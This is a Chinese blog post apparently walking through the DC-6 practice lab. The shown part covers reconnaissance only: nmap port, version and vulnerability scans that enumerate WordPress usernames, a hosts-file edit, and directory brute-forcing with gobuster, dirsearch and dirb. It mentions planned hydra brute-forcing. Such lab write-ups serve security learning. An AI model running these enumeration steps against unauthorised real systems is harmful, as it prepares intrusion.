

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#FFD8F2">
  <meta name="author" content="Sweety">
  <meta name="keywords" content="">
  
    <meta name="description" content="DC-6IP扫描通过开关靶机来确认目标靶机的IP地址： 开靶机前：  开靶机后：  可以确认，目标靶机的IP地址为：192.168.204.135 端口扫描nmap和tcp端口扫描12nmap -sN -p- 192.168.204.135nmap -sT -p- 192.168.204.135   由端口扫描可以知道，目标靶机开放的端口有：22和80端口，它们分别对应着ssh服务和http服务。">
<meta property="og:type" content="article">
<meta property="og:title" content="DC-6">
<meta property="og:url" content="https://haoisbinlove.github.io/2024/07/30/DC-6/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="DC-6IP扫描通过开关靶机来确认目标靶机的IP地址： 开靶机前：  开靶机后：  可以确认，目标靶机的IP地址为：192.168.204.135 端口扫描nmap和tcp端口扫描12nmap -sN -p- 192.168.204.135nmap -sT -p- 192.168.204.135   由端口扫描可以知道，目标靶机开放的端口有：22和80端口，它们分别对应着ssh服务和http服务。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721466473726.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721466588758.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721473317554.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721473643269.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721474020587.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721474459724.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721474619631.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721474725052.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721475758895.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721476116046.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721476235722.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721476518153.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721480942802.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721481500953.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721481597223.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721483033212.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721481976589.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721481920404.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721626449346.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721616222974.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721616704302.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721616973120.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721617167389.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721624077372.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721624369380.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721624638803.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721626484402.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721626563699.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721626854866.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721627244039.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721627774276.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721628066665.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721629740248.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721632560322.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633174618.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240722161127082.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633497290.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633567708.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633609315.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633630059.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633654428.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633768955.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721636490651.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721637189750.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721637413521.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721637749847.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721639725380.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721639777147.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640027157.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640165117.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640264134.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640859469.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640983822.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641019990.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641094356.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641213920.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641376061.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641640491.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647126070.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647469829.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647491273.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647651932.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647783119.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647828646.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647924638.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648522524.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648640692.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648731950.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648770504.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648879649.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649004211.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649141874.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649261175.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649353583.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651383415.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651471925.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651540788.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651582411.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649480690.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651683654.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651934366.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721652717673.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721652871391.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721652959342.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721653106562.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721653199105.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721653212105.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721653886328.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721654002112.png">
<meta property="article:published_time" content="2024-07-30T14:03:23.000Z">
<meta property="article:modified_time" content="2024-07-30T14:05:51.223Z">
<meta property="article:author" content="Sweety">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721466473726.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>DC-6 - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"haoisbinlove.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Sweety Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/24.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.08)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="DC-6"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-07-30 22:03" pubdate>
          2024年7月30日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4.8k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          40 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">DC-6</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>通过开关靶机来确认目标靶机的IP地址：</p>
<p>开靶机前：</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721466473726.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>开靶机后：</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721466588758.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>可以确认，目标靶机的IP地址为：<code>192.168.204.135</code></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="nmap和tcp端口扫描"><a href="#nmap和tcp端口扫描" class="headerlink" title="nmap和tcp端口扫描"></a>nmap和tcp端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN -p- 192.168.204.135<br>nmap -sT -p- 192.168.204.135<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721473317554.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>由端口扫描可以知道，目标靶机开放的端口有：<code>22</code>和<code>80</code>端口，它们分别对应着ssh服务和http服务。</p>
<p>好！这时候有关getshell的思路就可以有了：hydra爆破远程连接账户、网页信息检索&amp;CMS框架漏洞利用。</p>
<h3 id="端口详细扫描"><a href="#端口详细扫描" class="headerlink" title="端口详细扫描"></a>端口详细扫描</h3><p>查看更详细的端口信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 22,80 192.168.204.135<br></code></pre></td></tr></table></figure>

<p>扫描结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721473643269.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>其中，显示的有效信息有：</p>
<blockquote>
<p>22端口使用的ssh版本为：OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</p>
<p>22端口的主机密钥（十六进制表示格式）</p>
<p>80端口的网页似乎被重定向了：</p>
<p>Did not follow redirect to <a target="_blank" rel="noopener" href="http://wordy/">http://wordy/</a></p>
<p>并未遵从重定向到<a target="_blank" rel="noopener" href="http://wordy/">http://wordy/</a></p>
</blockquote>
<p>此时，可以先浅访问一下目标靶机的网站。（192.168.204.135）</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721474020587.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>果然，网页被重定向了。</p>
<h2 id="namp漏扫"><a href="#namp漏扫" class="headerlink" title="namp漏扫"></a>namp漏扫</h2><p>为了获取更多的信息，可以再进行namp扫描，看看能不能获得更多有用的信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 22,80 192.168.204.135<br></code></pre></td></tr></table></figure>

<p>扫描结果如下：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721474459724.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>！！！发现了一些<code>wordpress</code>用户名（wordpress是一种CMS框架捏），而且看情况，这些用户名由于用户限制并没有完全显现完。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721474619631.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<blockquote>
<p>admin</p>
<p>graham</p>
<p>mark</p>
<p>sarah</p>
<p>jens</p>
</blockquote>
<p>除此之外，<code>http-enum</code>还提供了与WordPress相关的各种发现：</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721474725052.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>是各种类型的文件：</p>
<blockquote>
<p>&#x2F;wp-login.php: Possible admin folder（可能是管理目录）</p>
<p>&#x2F;readme.html: Wordpress version: 2</p>
<p>&#x2F;wp-includes&#x2F;images&#x2F;rss.png: Wordpress version 2.2 found.</p>
<p>&#x2F;wp-includes&#x2F;js&#x2F;jquery&#x2F;suggest.js: Wordpress version 2.5 found.</p>
<p>&#x2F;wp-includes&#x2F;images&#x2F;blank.gif: Wordpress version 2.6 found.</p>
<p>&#x2F;wp-includes&#x2F;js&#x2F;comment-reply.js: Wordpress version 2.7 found.</p>
<p>上述各个文件所使用的Wordpress版本号涉及2、2.2、2.5、2.6、2.7.</p>
<p>&#x2F;wp-login.php: Wordpress login page.（Wordpress登陆界面）</p>
<p>&#x2F;wp-admin&#x2F;upgrade.php: Wordpress login page.（Wordpress登陆界面）</p>
<p>&#x2F;readme.html: Interesting, a readme.（一份说明文件）</p>
</blockquote>
<h2 id="重定向修改"><a href="#重定向修改" class="headerlink" title="重定向修改"></a>重定向修改</h2><p>上面进行端口扫描得到的信息显示重定向失败:</p>
<blockquote>
<p>Did not follow redirect to <a target="_blank" rel="noopener" href="http://wordy/">http://wordy/</a></p>
<p>并未遵从重定向到<a target="_blank" rel="noopener" href="http://wordy/">http://wordy/</a></p>
</blockquote>
<p>需要修改本地host文件，这里就在kali内部修改其host文件吧~</p>
<blockquote>
<p>打开 <code>etc/hosts</code>文件，添加本地DNS记录 <code>192.168.204.135 wordy</code></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/hosts<br></code></pre></td></tr></table></figure>

<p>添加完成后保存，退出。重新访问目标靶机的网站。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721475758895.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ok！成功正常访问目标靶机网站。</p>
<h2 id="网页信息检索"><a href="#网页信息检索" class="headerlink" title="网页信息检索"></a>网页信息检索</h2><h3 id="网页模块信息检索"><a href="#网页模块信息检索" class="headerlink" title="网页模块信息检索"></a>网页模块信息检索</h3><p>访问目标网站，其网页主要有三个内容模块：Welcome、About Us、Contact Us。</p>
<p>在Welcome中，它主要展示了wordy的主要运营产品：是WordPress插件和安全。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721476116046.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>在About Us中，主要展示了wordy的可信力，人力资源：主要开发者 jens 很厉害，jens 这个名字在前面的nmap漏扫也破获出来了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721476235722.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>在Contact Us中，主要就是欢迎的话语，没有任何有用的提示。</p>
<h3 id="Wapplayzer指纹识别"><a href="#Wapplayzer指纹识别" class="headerlink" title="Wapplayzer指纹识别"></a>Wapplayzer指纹识别</h3><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721476518153.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721480942802.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>如我们所料，目标网站使用的CMS框架果然是<code>WordPress</code>。到时候可以通过查找有关WordPress的漏洞进行利用。</p>
<p>为了提高容错率，我们还需要收集更多可能会有用的信息，因而我们可以先进行目录爆破。</p>
<h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><h3 id="gobuster爆破"><a href="#gobuster爆破" class="headerlink" title="gobuster爆破"></a>gobuster爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.135 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721481500953.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<blockquote>
<p>获得目录：</p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-content/">http://192.168.204.135/wp-content/</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-includes/">http://192.168.204.135/wp-includes/</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-admin/">http://192.168.204.135/wp-admin/</a></p>
</blockquote>
<h3 id="dirsearch爆破"><a href="#dirsearch爆破" class="headerlink" title="dirsearch爆破"></a>dirsearch爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u  http://192.168.204.135<br>dirsearch -u  http://192.168.204.135 -x 403,404,405,500<br>dirsearch -u  http://192.168.204.135 -x 400-500<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721481597223.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>不难看出，扫描的目录与响应状态有关，其中也有一些<code>4xx</code>和<code>5xx</code>系列的错误状态码数据包（对我们没啥用处的），所以我们可以在爆破之初，添加<code>-x</code>选项。</p>
<p><code>-x</code> ：不显示指定的状态码，指定多个通过逗号分隔，或者指定一个范围，两个数之间使用<code>-</code>连接。</p>
<p><code>2xx</code>：正常的正确响应</p>
<p><code>3xx</code>：重定向</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721483033212.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<blockquote>
<p>&#x2F;index.php</p>
<p>&#x2F;license.txt</p>
<p>&#x2F;readme.html</p>
<p>&#x2F;wp-admin&#x2F;install.php</p>
<p>&#x2F;wp-config.php</p>
<p>&#x2F;wp-content&#x2F;</p>
<p>&#x2F;wp-includes&#x2F;</p>
<p>&#x2F;wp-login.php</p>
<p>&#x2F;wp-cron.php</p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-admin/">http://192.168.204.135/wp-admin/</a></p>
<p><a target="_blank" rel="noopener" href="http://wordy/wp-login.php?redirect_to=http://192.168.204.135/wp-admin/&reauth=1">http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192.168.204.135%2Fwp-admin%2F&amp;reauth=1</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-content/">http://192.168.204.135/wp-content/</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-includes/">http://192.168.204.135/wp-includes/</a></p>
<p><a target="_blank" rel="noopener" href="http://wordy/wp-login.php?action=register">http://wordy/wp-login.php?action=register</a></p>
</blockquote>
<h3 id="dirb爆破"><a href="#dirb爆破" class="headerlink" title="dirb爆破"></a>dirb爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb  http://192.168.204.135<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721481976589.png" srcset="/img/loading.gif" lazyload alt="img"></p>
